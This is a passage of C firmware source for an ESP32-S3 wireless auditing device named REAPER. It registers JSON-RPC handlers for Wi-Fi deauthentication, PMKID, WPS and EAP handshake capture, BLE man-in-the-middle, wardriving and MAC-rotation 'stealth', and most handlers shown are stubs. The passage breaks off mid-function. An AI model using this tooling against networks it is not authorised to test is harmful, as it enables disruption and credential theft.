
static esp_err_t rpc_offensive_wps(const char *method, const char *params_json,
                                   char *out, size_t outsz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    off_wps_t w;
    if (offensive_get_wps(&w) != ESP_OK || !w.valid) {
        snprintf(out, outsz, "{\"error\":\"no_wps\"}");
        return ESP_ERR_NOT_FOUND;
    }
    snprintf(out, outsz,
        "{\"ap_bssid\":\"" MACSTR "\",\"m1_len\":%d}",
        MAC2STR(w.ap_bssid), w.m1_len);
    return ESP_OK;
}

static esp_err_t rpc_offensive_eap(const char *method, const char *params_json,
                                   char *out, size_t outsz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    off_eap_t e;
    offensive_get_eap(&e);
    snprintf(out, outsz,
        "{\"ap_bssid\":\"" MACSTR "\",\"sta_mac\":\"" MACSTR "\","
        "\"bytes\":%d}",
        MAC2STR(e.ap_bssid), MAC2STR(e.sta_mac), e.challenge_len);
    return ESP_OK;
}

static esp_err_t rpc_offensive_json(const char *method, const char *params_json,
                                    char *out, size_t outsz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    offensive_json(out, outsz);
    return ESP_OK;
}

static esp_err_t rpc_offensive_status(const char *method, const char *params_json,
                                      char *out, size_t outsz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    snprintf(out, outsz, "{\"enabled\":%s}", offensive_get_mode() ? "true" : "false");
    return ESP_OK;
}

static esp_err_t rpc_offensive_clear(const char *method, const char *params_json,
                                     char *out, size_t outsz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    offensive_deinit();
    snprintf(out, outsz, "{\"status\":\"cleared\"}");
    return ESP_OK;
}

static esp_err_t rpc_export_stats(const char *method, const char *params_json,
                                    char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[256];
    esp_err_t rc = export_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "export stats failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_system_ping(const char *method, const char *params_json,
                                 char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return jsonrpc_send_result(-1, "\"pong\"", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_system_info(const char *method, const char *params_json,
                                 char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "schema_version", SCHEMA_VERSION);
    cJSON_AddStringToObject(root, "firmware", "REAPER");
    cJSON_AddStringToObject(root, "chip", "ESP32-S3");
    const char *json = cJSON_PrintUnformatted(root);
    esp_err_t rc = jsonrpc_send_result(-1, json, out, out_sz);
    cJSON_free((void *)json);
    cJSON_Delete(root);
    return rc;
}

/*============================================================================*/
static esp_err_t rpc_system_caps(const char *method, const char *params_json,
                                 char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char caps[256];
    esp_err_t rc = usb_cdc_caps_to_json(caps, sizeof(caps));
    if (rc != ESP_OK) return rc;
    return jsonrpc_send_result(-1, caps, out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_system_health(const char *method, const char *params_json,
                                   char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    health_metrics_t m;
    esp_err_t rc = health_telemetry_get(&m);
    if (rc != ESP_OK) return rc;
    char json[128];
    snprintf(json, sizeof(json),
        "{\"uptime_s\":%u,\"free_heap\":%u,\"free_psram\":%u,"
        "\"cpu_temp_c\":%.2f,\"min_free_heap\":%u}",
        (unsigned)m.uptime_s, (unsigned)m.free_heap, (unsigned)m.free_psram,
        (float)m.cpu_temp_c / 100.0f, (unsigned)m.min_free_heap);
    return jsonrpc_send_result(-1, json, out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_system_crash(const char *method, const char *params_json,
                                  char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[512];
    esp_err_t rc = watchdog_read_crash(buf, sizeof(buf));
    if (rc != ESP_OK) return rc;
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_wifi_scan(const char *method, const char *params_json,
                               char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return jsonrpc_send_result(-1, "[]", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_wifi_start(const char *method, const char *params_json,
                                char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    wifi_sniffer_start(0);
    return jsonrpc_send_result(-1, "\"started\"", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_wifi_stop(const char *method, const char *params_json,
                               char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    wifi_sniffer_stop();
    return jsonrpc_send_result(-1, "\"stopped\"", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_wifi_channel(const char *method, const char *params_json,
                                  char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *p = cJSON_Parse(params_json);
    if (!p) return jsonrpc_send_error(-1, -32600, "Invalid params", out, out_sz);
    cJSON *ch = cJSON_GetObjectItem(p, "channel");
    if (!cJSON_IsNumber(ch)) {
        cJSON_Delete(p);
        return jsonrpc_send_error(-1, -32600, "channel required", out, out_sz);
    }
    cJSON_Delete(p);
    return jsonrpc_send_result(-1, "\"ok\"", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_deauth_start(const char *method, const char *params_json,
                                  char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return jsonrpc_send_result(-1, "\"started\"", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_deauth_stop(const char *method, const char *params_json,
                                 char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return jsonrpc_send_result(-1, "\"stopped\"", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_deauth_status(const char *method, const char *params_json,
                                   char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return jsonrpc_send_result(-1, "{\"active\":false,\"sent\":0}", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_pcap_start(const char *method, const char *params_json,
                                char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    esp_err_t rc = pcap_ring_start(0);
    if (rc != ESP_OK) return rc;
    return jsonrpc_send_result(-1, "\"started\"", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_pcap_stop(const char *method, const char *params_json,
                               char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    pcap_ring_stop();
    return jsonrpc_send_result(-1, "\"stopped\"", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_pcap_save(const char *method, const char *params_json,
                               char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    const char *path = "/spiffs/capture.pcap";
    if (params_json) {
        cJSON *p = cJSON_Parse(params_json);
        if (p) {
            cJSON *jpath = cJSON_GetObjectItem(p, "path");
            if (cJSON_IsString(jpath)) path = cJSON_GetStringValue(jpath);
            cJSON_Delete(p);
        }
    }
    esp_err_t rc = pcap_ring_save(path);
    if (rc != ESP_OK) return rc;
    return jsonrpc_send_result(-1, "{\"saved\":true}", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_ble_scan(const char *method, const char *params_json,
                              char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return jsonrpc_send_result(-1, "[]", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_ble_stop(const char *method, const char *params_json,
                              char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return jsonrpc_send_result(-1, "\"stopped\"", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_ble_list(const char *method, const char *params_json,
                              char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return jsonrpc_send_result(-1, "[]", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_ble_mitm_add(const char *method, const char *params_json,
                                  char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return jsonrpc_send_result(-1, "{\"status\":\"target_added\"}", out, out_sz);
}

static esp_err_t rpc_ble_mitm_list(const char *method, const char *params_json,
                                   char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return jsonrpc_send_result(-1, "[]", out, out_sz);
}

static esp_err_t rpc_ble_gatt_enumerate(const char *method, const char *params_json,
                                        char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return jsonrpc_send_result(-1, "{\"started\":true}", out, out_sz);
}

static esp_err_t rpc_ble_gatt_svcs(const char *method, const char *params_json,
                                   char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return jsonrpc_send_result(-1, "[]", out, out_sz);
}

static esp_err_t rpc_ble_gatt_chars(const char *method, const char *params_json,
                                    char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return jsonrpc_send_result(-1, "[]", out, out_sz);
}

static esp_err_t rpc_ble_findmy_list(const char *method, const char *params_json,
                                     char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return jsonrpc_send_result(-1, "[]", out, out_sz);
}

static esp_err_t rpc_ble_smarttag_list(const char *method, const char *params_json,
                                       char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return jsonrpc_send_result(-1, "[]", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_thread_start(const char *method, const char *params_json,
                                  char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    esp_err_t rc = thread_br_start();
    if (rc != ESP_OK) return rc;
    return jsonrpc_send_result(-1, "{\"status\":\"started\"}", out, out_sz);
}

static esp_err_t rpc_thread_stop(const char *method, const char *params_json,
                                 char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    (void)thread_br_stop();
    return jsonrpc_send_result(-1, "{\"status\":\"stopped\"}", out, out_sz);
}

static esp_err_t rpc_thread_status(const char *method, const char *params_json,
                                   char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char json[64];
    snprintf(json, sizeof(json), "{\"active\":%s}", thread_br_is_active() ? "true" : "false");
    return jsonrpc_send_result(-1, json, out, out_sz);
}

static esp_err_t rpc_matter_start(const char *method, const char *params_json,
                                  char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    esp_err_t rc = matter_commissioner_start(NULL);
    if (rc != ESP_OK) return rc;
    return jsonrpc_send_result(-1, "{\"status\":\"started\"}", out, out_sz);
}

static esp_err_t rpc_matter_stop(const char *method, const char *params_json,
                                 char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    (void)matter_commissioner_stop();
    return jsonrpc_send_result(-1, "{\"status\":\"stopped\"}", out, out_sz);
}

static esp_err_t rpc_matter_status(const char *method, const char *params_json,
                                   char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char json[64];
    snprintf(json, sizeof(json), "{\"active\":%s}", matter_commissioner_is_active() ? "true" : "false");
    return jsonrpc_send_result(-1, json, out, out_sz);
}

static esp_err_t rpc_zigbee_start(const char *method, const char *params_json,
                                  char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    esp_err_t rc = zigbee_sniffer_start(11);
    if (rc != ESP_OK) return rc;
    return jsonrpc_send_result(-1, "{\"status\":\"started\"}", out, out_sz);
}

static esp_err_t rpc_zigbee_stop(const char *method, const char *params_json,
                                 char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    (void)zigbee_sniffer_stop();
    return jsonrpc_send_result(-1, "{\"status\":\"stopped\"}", out, out_sz);
}

static esp_err_t rpc_zigbee_status(const char *method, const char *params_json,
                                   char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char json[64];
    snprintf(json, sizeof(json), "{\"active\":%s}", zigbee_sniffer_is_active() ? "true" : "false");
    return jsonrpc_send_result(-1, json, out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_health_ai_status(const char *method, const char *params_json,
                                      char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return health_ai_monitor_json(out, out_sz);
}

static esp_err_t rpc_health_ai_heal(const char *method, const char *params_json,
                                    char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    esp_err_t rc = health_ai_monitor_heal();
    if (rc != ESP_OK) return rc;
    return jsonrpc_send_result(-1, "{\"status\":\"healed\"}", out, out_sz);
}

static esp_err_t rpc_wordlist_count(const char *method, const char *params_json,
                                    char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char json[64];
    snprintf(json, sizeof(json), "{\"count\":%d}", (int)wordlist_manager_count());
    return jsonrpc_send_result(-1, json, out, out_sz);
}

static esp_err_t rpc_wordlist_lookup(const char *method, const char *params_json,
                                     char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    return jsonrpc_send_result(-1, "{\"found\":false}", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_storage_wordlist_list(const char *method, const char *params_json,
                                           char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[256];
    esp_err_t rc = storage_spiffs_list_wordlists_json(buf, sizeof(buf));
    if (rc != ESP_OK) return rc;
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_storage_wordlist_load(const char *method, const char *params_json,
                                           char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *p = cJSON_Parse(params_json);
    if (!p) return jsonrpc_send_error(-1, -32600, "Invalid params", out, out_sz);
    cJSON *jname = cJSON_GetObjectItem(p, "name");
    if (!cJSON_IsString(jname)) {
        cJSON_Delete(p);
        return jsonrpc_send_error(-1, -32600, "name required", out, out_sz);
    }
    const char *name = cJSON_GetStringValue(jname);
    esp_err_t rc = storage_spiffs_load_wordlist_meta(name);
    cJSON_Delete(p);
    if (rc != ESP_OK) return rc;
    return jsonrpc_send_result(-1, "{\"loaded\":true}", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_storage_nvs_reset(const char *method, const char *params_json,
                                       char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    esp_err_t rc = persist_erase_all();
    if (rc != ESP_OK) return rc;
    return jsonrpc_send_result(-1, "\"reset\"", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_ota_start(const char *method, const char *params_json,
                               char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *p = cJSON_Parse(params_json);
    if (!p) return jsonrpc_send_error(-1, -32600, "Invalid params", out, out_sz);
    cJSON *jurl = cJSON_GetObjectItem(p, "url");
    if (!cJSON_IsString(jurl)) {
        cJSON_Delete(p);
        return jsonrpc_send_error(-1, -32600, "url required", out, out_sz);
    }
    char url_buf[256] = {0};
    snprintf(url_buf, sizeof(url_buf), "%s", cJSON_GetStringValue(jurl));
    cJSON_Delete(p);
    ota_status_t st = ota_http_start(url_buf, NULL, 0);
    if (st != OTA_OK) return ESP_FAIL;
    return jsonrpc_send_result(-1, "\"started\"", out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_ota_progress(const char *method, const char *params_json,
                                  char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    int progress = ota_http_progress();
    char json[64];
    snprintf(json, sizeof(json), "{\"progress\":%d}", progress);
    return jsonrpc_send_result(-1, json, out, out_sz);
}

/*============================================================================*/
static uint16_t build_system_methods(jsonrpc_method_entry_t *table, uint16_t cap)
{
    if (cap < 83) return 0;
    table[0].name = "system.ping";      table[0].fn = rpc_system_ping;      table[0].user_ctx = NULL;
    table[1].name = "system.info";      table[1].fn = rpc_system_info;      table[1].user_ctx = NULL;
    table[2].name = "system.caps";      table[2].fn = rpc_system_caps;      table[2].user_ctx = NULL;
    table[3].name = "system.health";    table[3].fn = rpc_system_health;    table[3].user_ctx = NULL;
    table[4].name = "system.crash";     table[4].fn = rpc_system_crash;     table[4].user_ctx = NULL;
    table[5].name = "gps.set_fix";      table[5].fn = rpc_gps_set_fix;      table[5].user_ctx = NULL;
    table[6].name = "gps.get_fix";      table[6].fn = rpc_gps_get_fix;      table[6].user_ctx = NULL;
    table[7].name = "gps.status";       table[7].fn = rpc_gps_status;       table[7].user_ctx = NULL;
    table[8].name = "coex.set_pref";    table[8].fn = rpc_coex_set_pref;    table[8].user_ctx = NULL;
    table[9].name = "coex.get_status";  table[9].fn = rpc_coex_get_status;  table[9].user_ctx = NULL;
    table[10].name = "coex.json";       table[10].fn = rpc_coex_json;       table[10].user_ctx = NULL;
    table[11].name = "ai.model.load";   table[11].fn = rpc_ai_load;         table[11].user_ctx = NULL;
    table[12].name = "ai.model.unload"; table[12].fn = rpc_ai_unload;       table[12].user_ctx = NULL;
    table[13].name = "ai.model.infer";  table[13].fn = rpc_ai_infer;        table[13].user_ctx = NULL;
    table[14].name = "ai.model.list";   table[14].fn = rpc_ai_list;         table[14].user_ctx = NULL;
    table[15].name = "ai.classify.test";table[15].fn = rpc_ai_classify_test;table[15].user_ctx = NULL;
    table[16].name = "ai.classify.stats";table[16].fn = rpc_ai_classify_stats;table[16].user_ctx = NULL;
    table[17].name = "ai.classify.set_model";table[17].fn = rpc_ai_classify_set_model;table[17].user_ctx = NULL;
    table[18].name = "ai.anomaly.set_model"; table[18].fn = rpc_ai_anomaly_set_model; table[18].user_ctx = NULL;
    table[19].name = "ai.anomaly.set_threshold"; table[19].fn = rpc_ai_anomaly_set_threshold; table[19].user_ctx = NULL;
    table[20].name = "ai.anomaly.stats"; table[20].fn = rpc_ai_anomaly_stats; table[20].user_ctx = NULL;
    table[21].name = "ai.fp.set_model"; table[21].fn = rpc_ai_fp_set_model;   table[21].user_ctx = NULL;
    table[22].name = "ai.fp.stats";     table[22].fn = rpc_ai_fp_stats;       table[22].user_ctx = NULL;
    table[23].name = "ai.fp.test";      table[23].fn = rpc_ai_fp_test;        table[23].user_ctx = NULL;
    table[24].name = "ai.channel.predict"; table[24].fn = rpc_ai_channel_predict; table[24].user_ctx = NULL;
    table[25].name = "ai.channel.stats"; table[25].fn = rpc_ai_channel_stats; table[25].user_ctx = NULL;
    table[26].name = "ai.channel.record"; table[26].fn = rpc_ai_channel_record; table[26].user_ctx = NULL;
    table[27].name = "ai.channel.set_model"; table[27].fn = rpc_ai_channel_set_model; table[27].user_ctx = NULL;
    table[28].name = "ai.hs.score";     table[28].fn = rpc_ai_hs_score;      table[28].user_ctx = NULL;
    table[29].name = "ai.hs.stats";     table[29].fn = rpc_ai_hs_stats;      table[29].user_ctx = NULL;
    table[30].name = "ai.hs.set_model"; table[30].fn = rpc_ai_hs_set_model;   table[30].user_ctx = NULL;
    table[31].name = "ai.hs.test";      table[31].fn = rpc_ai_hs_test;        table[31].user_ctx = NULL;
    table[32].name = "ai.rogue.scan";   table[32].fn = rpc_ai_rogue_scan;    table[32].user_ctx = NULL;
    table[33].name = "ai.rogue.alerts"; table[33].fn = rpc_ai_rogue_alerts;  table[33].user_ctx = NULL;
    table[34].name = "ai.deauth.predict"; table[34].fn = rpc_ai_deauth_predict; table[34].user_ctx = NULL;
    table[35].name = "ai.deauth.predict_all"; table[35].fn = rpc_ai_deauth_predict_all; table[35].user_ctx = NULL;
    table[36].name = "ai.deauth.stats"; table[36].fn = rpc_ai_deauth_stats; table[36].user_ctx = NULL;
    table[37].name = "ai.deauth.set_model"; table[37].fn = rpc_ai_deauth_set_model; table[37].user_ctx = NULL;
    table[38].name = "ai.ble.classify"; table[38].fn = rpc_ai_ble_classify; table[38].user_ctx = NULL;
    table[39].name = "ai.ble.stats";    table[39].fn = rpc_ai_ble_stats;    table[39].user_ctx = NULL;
    table[40].name = "ai.ble.set_model"; table[40].fn = rpc_ai_ble_set_model; table[40].user_ctx = NULL;
    table[41].name = "ai.train.start";  table[41].fn = rpc_ai_train_start;  table[41].user_ctx = NULL;
    table[42].name = "ai.train.stop";   table[42].fn = rpc_ai_train_stop;   table[42].user_ctx = NULL;
    table[43].name = "ai.train.stats";  table[43].fn = rpc_ai_train_stats;  table[43].user_ctx = NULL;
    table[44].name = "ai.train.status"; table[44].fn = rpc_ai_train_status; table[44].user_ctx = NULL;
    table[45].name = "wardrive.start";  table[45].fn = rpc_wardrive_start;  table[45].user_ctx = NULL;
    table[46].name = "wardrive.stop";   table[46].fn = rpc_wardrive_stop;   table[46].user_ctx = NULL;
    table[47].name = "wardrive.stats";  table[47].fn = rpc_wardrive_stats;  table[47].user_ctx = NULL;
    table[48].name = "wardrive.status"; table[48].fn = rpc_wardrive_status; table[48].user_ctx = NULL;
    table[49].name = "attack.plan";     table[49].fn = rpc_attack_plan;     table[49].user_ctx = NULL;
    table[50].name = "attack.best";     table[50].fn = rpc_attack_best;     table[50].user_ctx = NULL;
    table[51].name = "attack.stats";    table[51].fn = rpc_attack_stats;    table[51].user_ctx = NULL;
    table[52].name = "stealth.set_mode"; table[52].fn = rpc_stealth_set_mode; table[52].user_ctx = NULL;
    table[53].name = "stealth.rotate_mac"; table[53].fn = rpc_stealth_rotate; table[53].user_ctx = NULL;
    table[54].name = "stealth.status";  table[54].fn = rpc_stealth_status;  table[54].user_ctx = NULL;
    table[55].name = "scheduler.add";   table[55].fn = rpc_scheduler_add;   table[55].user_ctx = NULL;
    table[56].name = "scheduler.remove"; table[56].fn = rpc_scheduler_remove; table[56].user_ctx = NULL;
    table[57].name = "scheduler.update"; table[57].fn = rpc_scheduler_update; table[57].user_ctx = NULL;
    table[58].name = "scheduler.list";  table[58].fn = rpc_scheduler_list;  table[58].user_ctx = NULL;
    table[59].name = "scheduler.save";  table[59].fn = rpc_scheduler_save;  table[59].user_ctx = NULL;
    table[60].name = "reaction.add";    table[60].fn = rpc_reaction_add;    table[60].user_ctx = NULL;
    table[61].name = "reaction.remove"; table[61].fn = rpc_reaction_remove; table[61].user_ctx = NULL;
    table[62].name = "reaction.list";   table[62].fn = rpc_reaction_list;   table[62].user_ctx = NULL;
    table[63].name = "export.start";    table[63].fn = rpc_export_start;    table[63].user_ctx = NULL;
    table[64].name = "export.stop";     table[64].fn = rpc_export_stop;     table[64].user_ctx = NULL;
    table[65].name = "export.stats";    table[65].fn = rpc_export_stats;    table[65].user_ctx = NULL;
    table[66].name = "offensive.set_mode"; table[66].fn = rpc_offensive_set_mode; table[66].user_ctx = NULL;
    table[67].name = "offensive.get_mode"; table[67].fn = rpc_offensive_get_mode; table[67].user_ctx = NULL;
    table[68].name = "offensive.pmkid";    table[68].fn = rpc_offensive_pmkid;    table[68].user_ctx = NULL;
    table[69].name = "offensive.sae";      table[69].fn = rpc_offensive_sae;      table[69].user_ctx = NULL;
    table[70].name = "offensive.dragonfly"; table[70].fn = rpc_offensive_dragonfly; table[70].user_ctx = NULL;
    table[71].name = "offensive.ft";        table[71].fn = rpc_offensive_ft;        table[71].user_ctx = NULL;
    table[72].name = "offensive.11k";       table[72].fn = rpc_offensive_11k;       table[72].user_ctx = NULL;
    table[73].name = "offensive.11v";       table[73].fn = rpc_offensive_11v;       table[73].user_ctx = NULL;
    table[74].name = "offensive.wps";       table[74].fn = rpc_offensive_wps;       table[74].user_ctx = NULL;
    table[75].name = "offensive.eap";       table[75].fn = rpc_offensive_eap;       table[75].user_ctx = NULL;
    table[76].name = "offensive.json";      table[76].fn = rpc_offensive_json;      table[76].user_ctx = NULL;
    table[77].name = "offensive.status";    table[77].fn = rpc_offensive_status;    table[77].user_ctx = NULL;
    table[78].name = "offensive.clear";     table[78].fn = rpc_offensive_clear;     table[78].user_ctx = NULL;
    table[79].name = "health.ai.status";    table[79].fn = rpc_health_ai_status;    table[79].user_ctx = NULL;
    table[80].name = "health.ai.heal";      table[80].fn = rpc_health_ai_heal;      table[80].user_ctx = NULL;
    table[81].name = "wordlist.count";      table[81].fn = rpc_wordlist_count;      table[81].user_ctx = NULL;
    table[82].name = "wordlist.lookup";     table[82].fn = rpc_wordlist_lookup;     table[82].user_ctx = NULL;
    return 83;
}

static uint16_t build_wifi_methods(jsonrpc_method_entry_t *table, uint16_t cap)
{
    if (cap < 4) return 0;
    table[0].name = "wifi.scan";      table[0].fn = rpc_wifi_scan;      table[0].user_ctx = NULL;
    table[1].name = "wifi.start";     table[1].fn = rpc_wifi_start;     table[1].user_ctx = NULL;
    table[2].name = "wifi.stop";      table[2].fn = rpc_wifi_stop;      table[2].user_ctx = NULL;
    table[3].name = "wifi.channel";   table[3].fn = rpc_wifi_channel;   table[3].user_ctx = NULL;
    return 4;
}

static uint16_t build_deauth_methods(jsonrpc_method_entry_t *table, uint16_t cap)
{
    if (cap < 3) return 0;
    table[0].name = "deauth.start";   table[0].fn = rpc_deauth_start;   table[0].user_ctx = NULL;
    table[1].name = "deauth.stop";    table[1].fn = rpc_deauth_stop;    table[1].user_ctx = NULL;
    table[2].name = "deauth.status";  table[2].fn = rpc_deauth_status;  table[2].user_ctx = NULL;
    return 3;
}

static uint16_t build_pcap_methods(jsonrpc_method_entry_t *table, uint16_t cap)
{
    if (cap < 3) return 0;
    table[0].name = "pcap.start";     table[0].fn = rpc_pcap_start;     table[0].user_ctx = NULL;
    table[1].name = "pcap.stop";      table[1].fn = rpc_pcap_stop;      table[1].user_ctx = NULL;
    table[2].name = "pcap.save";      table[2].fn = rpc_pcap_save;      table[2].user_ctx = NULL;
    return 3;
}

static uint16_t build_ble_methods(jsonrpc_method_entry_t *table, uint16_t cap)
{
    if (cap < 10) return 0;
    table[0].name = "ble.scan";            table[0].fn = rpc_ble_scan;            table[0].user_ctx = NULL;
    table[1].name = "ble.stop";            table[1].fn = rpc_ble_stop;            table[1].user_ctx = NULL;
    table[2].name = "ble.list";            table[2].fn = rpc_ble_list;            table[2].user_ctx = NULL;
    table[3].name = "ble.mitm.add";        table[3].fn = rpc_ble_mitm_add;        table[3].user_ctx = NULL;
    table[4].name = "ble.mitm.list";       table[4].fn = rpc_ble_mitm_list;       table[4].user_ctx = NULL;
    table[5].name = "ble.gatt.enumerate";  table[5].fn = rpc_ble_gatt_enumerate;  table[5].user_ctx = NULL;
    table[6].name = "ble.gatt.svcs";       table[6].fn = rpc_ble_gatt_svcs;       table[6].user_ctx = NULL;
    table[7].name = "ble.gatt.chars";      table[7].fn = rpc_ble_gatt_chars;      table[7].user_ctx = NULL;
    table[8].name = "ble.findmy.list";     table[8].fn = rpc_ble_findmy_list;     table[8].user_ctx = NULL;
    table[9].name = "ble.smarttag.list";   table[9].fn = rpc_ble_smarttag_list;   table[9].user_ctx = NULL;
    return 10;
}

static uint16_t build_80215_methods(jsonrpc_method_entry_t *table, uint16_t cap)
{
    if (cap < 9) return 0;
    table[0].name = "thread.start";     table[0].fn = rpc_thread_start;     table[0].user_ctx = NULL;
    table[1].name = "thread.stop";      table[1].fn = rpc_thread_stop;      table[1].user_ctx = NULL;
    table[2].name = "thread.status";    table[2].fn = rpc_thread_status;    table[2].user_ctx = NULL;
    table[3].name = "matter.start";     table[3].fn = rpc_matter_start;     table[3].user_ctx = NULL;
    table[4].name = "matter.stop";      table[4].fn = rpc_matter_stop;      table[4].user_ctx = NULL;
    table[5].name = "matter.status";    table[5].fn = rpc_matter_status;    table[5].user_ctx = NULL;
    table[6].name = "zigbee.start";     table[6].fn = rpc_zigbee_start;     table[6].user_ctx = NULL;
    table[7].name = "zigbee.stop";      table[7].fn = rpc_zigbee_stop;      table[7].user_ctx = NULL;
    table[8].name = "zigbee.status";    table[8].fn = rpc_zigbee_status;    table[8].user_ctx = NULL;
    return 9;
}

static uint16_t build_storage_methods(jsonrpc_method_entry_t *table, uint16_t cap)
{
    if (cap < 3) return 0;
    table[0].name = "storage.wordlist.list";      table[0].fn = rpc_storage_wordlist_list;      table[0].user_ctx = NULL;
    table[1].name = "storage.wordlist.load";      table[1].fn = rpc_storage_wordlist_load;      table[1].user_ctx = NULL;
    table[2].name = "storage.nvs.factory_reset";  table[2].fn = rpc_storage_nvs_reset;          table[2].user_ctx = NULL;
    return 3;
}

static uint16_t build_ota_methods(jsonrpc_method_entry_t *table, uint16_t cap)
{
    if (cap < 2) return 0;
    table[0].name = "ota.start";      table[0].fn = rpc_ota_start;      table[0].user_ctx = NULL;
    table[1].name = "ota.progress";   table[1].fn = rpc_ota_progress;   table[1].user_ctx = NULL;
    return 2;
}

/* ============================================================================
 *  Stub for platform methods (not yet implemented)
 * ============================================================================ */

static uint16_t build_platform_methods(jsonrpc_method_entry_t *table, uint16_t cap)
{
    (void)table; (void)cap;
    /* Platform methods not yet implemented */
    return 0;
}

/*============================================================================*/
const char *jsonrpc_schema_version(void)
{
    return SCHEMA_VERSION;
}

/*============================================================================*/
uint16_t jsonrpc_schema_v1_build(jsonrpc_method_entry_t *table, uint16_t cap)
{
    if (table == NULL || cap == 0) {
        return 0;
    }

    uint16_t offset = 0;
